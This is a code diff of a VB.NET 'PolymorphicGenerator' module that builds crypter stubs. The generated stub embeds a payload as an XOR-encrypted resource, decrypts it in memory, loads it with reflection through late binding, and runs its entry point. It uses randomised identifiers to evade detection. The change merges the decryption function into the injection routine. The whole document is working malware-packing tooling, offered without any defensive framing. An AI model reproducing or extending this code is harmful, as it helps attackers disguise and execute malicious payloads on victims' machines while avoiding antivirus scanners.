@@ -77,13 +77,8 @@ Module PolymorphicGenerator
         options.ReferencedAssemblies.Add("System.IO.dll")
 
         Dim payloadName As String = GenerateRandomString(),
-            xorFunctionName As String = GenerateRandomString(),
             injectionSubName As String = GenerateRandomString(),
-            streamVarName As String = GenerateRandomString(),
-            payloadArgName As String = GenerateRandomString(),
-            xorInputArgName As String = GenerateRandomString(),
-            xorKeyArgName As String = GenerateRandomString()
-
+            encryptedPayloadArgName As String = GenerateRandomString()
 
         File.Copy(fileNameToPack, payloadName)
 
@@ -137,29 +132,26 @@ Sub {originalEpName}
             Next
         End If
 
-        sourceCode.AppendLine($"Using {streamVarName} As Stream = Assembly.GetExecutingAssembly().GetManifestResourceStream(""{payloadName}"")
-        If Not {streamVarName} Is Nothing Then
-            Using reader As New BinaryReader({streamVarName})
-                {injectionSubName}( {xorFunctionName}(reader.ReadBytes(CInt({streamVarName}.Length)) , {keyArr} ) )
+        sourceCode.AppendLine($"Using manifestResourceStream As Stream = Assembly.GetExecutingAssembly().GetManifestResourceStream(""{payloadName}"")
+        If Not manifestResourceStream Is Nothing Then
+            Using reader As New BinaryReader(manifestResourceStream)
+                {injectionSubName}( reader.ReadBytes(CInt(manifestResourceStream.Length)) )
             End Using
         End If
     End Using
 End Sub")
 
-        sourceCode.AppendLine($"Sub {injectionSubName}({payloadArgName}) ' injection
-    
+        sourceCode.AppendLine($"Sub {injectionSubName}({encryptedPayloadArgName}) ' injection
+
+    Dim decryptedPayload({sizeOfPayload - 1}) As Byte
+    For i As Integer = 0 To {sizeOfPayload - 1}
+        decryptedPayload(i) = {encryptedPayloadArgName}(i) Xor {keyArr}(i Mod {keyLength})
+    Next
+
     NewLateBinding.LateCall(
-        NewLateBinding.LateGet(NewLateBinding.LateGet(Nothing, Type.GetType(""System.Reflection.Assembly""), ""Load"", New Object() {{ RuntimeHelpers.GetObjectValue({payloadArgName}) }}, Nothing, Nothing, {{ True }}),
+        NewLateBinding.LateGet(NewLateBinding.LateGet(Nothing, Type.GetType(""System.Reflection.Assembly""), ""Load"", New Object() {{ RuntimeHelpers.GetObjectValue(decryptedPayload) }}, Nothing, Nothing, {{ True }}),
     Nothing, ""EntryPoint"", New Object(-1) {{}}, Nothing, Nothing, Nothing), Nothing, ""Invoke"", New Object() {{ Nothing, Nothing }}, Nothing, Nothing, Nothing, True)
 End Sub
-
-Function {xorFunctionName}({xorInputArgName} As Byte(), {xorKeyArgName} As Byte()) As Byte() ' decryption
-    Dim encryptedArray({sizeOfPayload - 1}) As Byte
-    For i As Integer = 0 To {sizeOfPayload - 1}
-        encryptedArray(i) = {xorInputArgName}(i) Xor {xorKeyArgName}(i Mod {keyLength})
-    Next
-    Return encryptedArray
-End Function
 End Module
 ")
 
